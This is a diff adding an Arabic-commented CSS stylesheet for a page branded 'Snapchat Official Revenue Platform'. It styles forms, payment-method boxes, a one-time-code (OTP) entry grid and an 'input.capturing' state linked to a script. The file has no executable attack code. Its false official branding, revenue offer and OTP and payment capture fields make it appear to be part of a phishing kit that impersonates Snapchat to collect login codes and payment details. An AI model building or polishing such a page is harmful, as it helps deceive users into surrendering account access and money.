@@ -1,0 +1,322 @@
+/* ===============================================
+    Snapchat Official Revenue Platform - Stylesheet
+    Version: 2.1 (Security Integration Update)
+    ===============================================
+*/
+
+/* 1. إعدادات المتغيرات العامة */
+:root {
+    --snap-yellow: #FFFC00;
+    --snap-black: #000000;
+    --dark-gray: #1a1a1a;
+    --light-gray: #f8f9fa;
+    --border-color: #eeeeee;
+    --success-green: #28a745;
+    --error-red: #d9534f;
+    --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    --shadow-sm: 0 2px 5px rgba(0,0,0,0.05);
+    --shadow-md: 0 10px 30px rgba(0,0,0,0.08);
+    --shadow-lg: 0 20px 50px rgba(0,0,0,0.12);
+}
+
+/* 2. إعادة ضبط المتصفح (Global Reset) */
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    -webkit-tap-highlight-color: transparent;
+}
+
+body {
+    direction: rtl;
+    text-align: right;
+    background-color: var(--light-gray);
+    font-family: 'Almarai', 'Segoe UI', sans-serif;
+    color: #333;
+    line-height: 1.6;
+    overflow-x: hidden;
+}
+
+.container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 25px;
+}
+
+/* 3. الهيدر واللوجو الرسمي */
+header {
+    background-color: #ffffff;
+    padding: 15px 0;
+    box-shadow: var(--shadow-sm);
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    border-bottom: 1px solid var(--border-color);
+}
+
+header .container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.logo {
+    width: 42px;
+    height: auto;
+    transition: var(--transition);
+}
+
+.logo:hover {
+    transform: rotate(-10deg) scale(1.1);
+}
+
+.badge {
+    background: #e6fcf5;
+    color: #0ca678;
+    padding: 5px 15px;
+    border-radius: 20px;
+    font-size: 0.75rem;
+    font-weight: 800;
+}
+
+/* 4. قسم البطل (Hero Section) */
+.hero {
+    background: linear-gradient(135deg, #FFFC00 0%, #FFE500 100%);
+    padding: 100px 0 60px;
+    text-align: center;
+    position: relative;
+    clip-path: ellipse(150% 100% at 50% 0%);
+}
+
+.hero h1 {
+    font-size: 2.8rem;
+    margin-bottom: 20px;
+    color: var(--snap-black);
+    font-weight: 800;
+    letter-spacing: -1px;
+}
+
+.hero p {
+    font-size: 1.2rem;
+    color: rgba(0,0,0,0.7);
+    max-width: 700px;
+    margin: 0 auto 40px;
+}
+
+/* 5. الفيديو التفاعلي */
+.video-container {
+    max-width: 750px;
+    margin: 0 auto;
+    border-radius: 25px;
+    overflow: hidden;
+    box-shadow: var(--shadow-lg);
+    border: 8px solid #fff;
+    background: #000;
+    position: relative;
+    aspect-ratio: 16/9;
+}
+
+.video-container iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
+}
+
+/* 6. الأزرار الرسمية (CTA) */
+.btn-main, button {
+    background-color: var(--snap-black);
+    color: var(--snap-yellow);
+    border: none;
+    padding: 18px 45px;
+    font-size: 1.15rem;
+    font-weight: 800;
+    border-radius: 18px;
+    cursor: pointer;
+    transition: var(--transition);
+    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+}
+
+.btn-main:hover, button:hover:not(:disabled) {
+    transform: translateY(-4px);
+    box-shadow: 0 15px 35px rgba(0,0,0,0.25);
+    background-color: #222;
+}
+
+.btn-main:active { transform: translateY(0); }
+
+button:disabled {
+    background-color: #666;
+    cursor: not-allowed;
+    opacity: 0.7;
+}
+
+/* 7. الميزات والخطوات (Features & Steps) */
+.features { padding: 80px 0; background: #fff; }
+
+.section-title { text-align: center; margin-bottom: 50px; }
+.section-title h2 { font-size: 2rem; font-weight: 800; margin-bottom: 15px; }
+.title-underline { width: 60px; height: 5px; background: var(--snap-yellow); margin: 0 auto; border-radius: 10px; }
+
+.feature-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 30px;
+}
+
+.feature-item, .step-card {
+    background: #fdfdfd;
+    padding: 40px 30px;
+    border-radius: 24px;
+    border: 1px solid #f0f0f0;
+    transition: var(--transition);
+    text-align: center;
+}
+
+.feature-item:hover {
+    border-color: var(--snap-yellow);
+    background: #fff;
+    transform: translateY(-10px);
+}
+
+.icon-wrap {
+    width: 70px; height: 70px;
+    background: #fffdf0;
+    border-radius: 20px;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 25px;
+}
+
+/* 8. النماذج الاحترافية (Form UI) */
+.form-wrapper {
+    background-color: #ffffff;
+    max-width: 520px;
+    margin: 60px auto;
+    padding: 45px;
+    border-radius: 35px;
+    box-shadow: var(--shadow-lg);
+    border: 1px solid rgba(0,0,0,0.03);
+}
+
+.form-group { margin-bottom: 25px; position: relative; }
+.form-group label {
+    display: block; margin-bottom: 10px; font-weight: 800;
+    color: var(--dark-gray); font-size: 0.9rem;
+}
+
+.form-group input {
+    width: 100%; padding: 16px 20px;
+    border: 2px solid #f0f0f0;
+    border-radius: 16px;
+    font-size: 1rem;
+    font-weight: 600;
+    background-color: #f9f9f9;
+    transition: var(--transition);
+}
+
+.form-group input:focus {
+    border-color: var(--snap-black);
+    background-color: #fff;
+    outline: none;
+}
+
+/* الأيقونات داخل الحقول */
+.field-icon {
+    position: absolute; left: 18px; top: 43px;
+    width: 22px; height: 22px; opacity: 0.8;
+}
+
+/* 9. شاشة التحميل (Official Loader) */
+.loading-overlay {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background-color: rgba(255, 252, 0, 0.98); /* تم تعديل اللون ليكون أصفر سناب شفاف */
+    z-index: 10000;
+    display: flex; flex-direction: column; justify-content: center; align-items: center;
+    backdrop-filter: blur(10px);
+}
+
+.loader {
+    width: 60px; height: 60px;
+    background-color: var(--snap-black); /* تعديل اللون للتناسق */
+    border-radius: 18px; margin-bottom: 25px;
+    border: 3px solid var(--snap-black);
+    animation: snapRotate 2s infinite cubic-bezier(0.68, -0.55, 0.265, 1.55);
+}
+
+@keyframes snapRotate {
+    0% { transform: scale(1) rotate(0deg); }
+    50% { transform: scale(1.2) rotate(180deg); border-radius: 50%; }
+    100% { transform: scale(1) rotate(360deg); }
+}
+
+/* 10. الإشعارات (Toast Notifications) */
+.notification-toast {
+    position: fixed; bottom: 30px; right: 30px;
+    background: #fff; padding: 15px 25px;
+    border-radius: 20px; box-shadow: var(--shadow-lg);
+    display: flex; align-items: center; gap: 15px;
+    border-right: 6px solid var(--snap-yellow);
+    z-index: 9999;
+}
+
+/* 11. تفاصيل صفحة الدفع (Payment Methods) */
+.method-box {
+    border: 2px solid #f0f0f0;
+    border-radius: 20px; padding: 25px;
+    text-align: center; cursor: pointer;
+    transition: var(--transition);
+}
+
+.method-box.active {
+    border-color: var(--snap-black);
+    background: #fafafa;
+    transform: scale(1.02);
+}
+
+.method-box img { width: 50px; margin-bottom: 10px; }
+
+/* 12. الفوتر (Official Footer) */
+footer {
+    background-color: var(--dark-gray);
+    color: #888;
+    padding: 60px 0 30px;
+    margin-top: 80px;
+    text-align: center;
+}
+
+.footer-bottom {
+    margin-top: 40px;
+    padding-top: 25px;
+    border-top: 1px solid #333;
+    font-size: 0.8rem;
+}
+
+/* 13. التجاوب مع الجوال (Media Queries) */
+@media (max-width: 768px) {
+    .hero h1 { font-size: 2rem; }
+    .form-wrapper { margin: 20px; padding: 25px; }
+    .hero { padding: 60px 0 40px; }
+    .video-container { border: 4px solid #fff; }
+    .notification-toast { left: 20px; right: 20px; bottom: 20px; }
+}
+
+/* 14. نظام OTP */
+.otp-container { display: flex; justify-content: center; gap: 10px; direction: ltr; margin: 30px 0; }
+.otp-input, .otp-box {
+    width: 50px; height: 60px;
+    border: 2px solid #ddd; border-radius: 12px;
+    text-align: center; font-size: 1.5rem; font-weight: 800;
+    transition: var(--transition);
+}
+.otp-input:focus, .otp-box:focus { border-color: var(--snap-yellow); outline: none; background: #fffdf0; }
+
+/* 15. تحسينات الربط مع script.js (إضافات جديدة) */
+#custom-loader-text {
+    font-weight: 800;
+    color: var(--snap-black);
+    margin-top: 15px;
+}
+
+input.capturing {
+    border-color: var(--snap-yellow) !important;
+    background-color: #fffdf0 !important;
+}
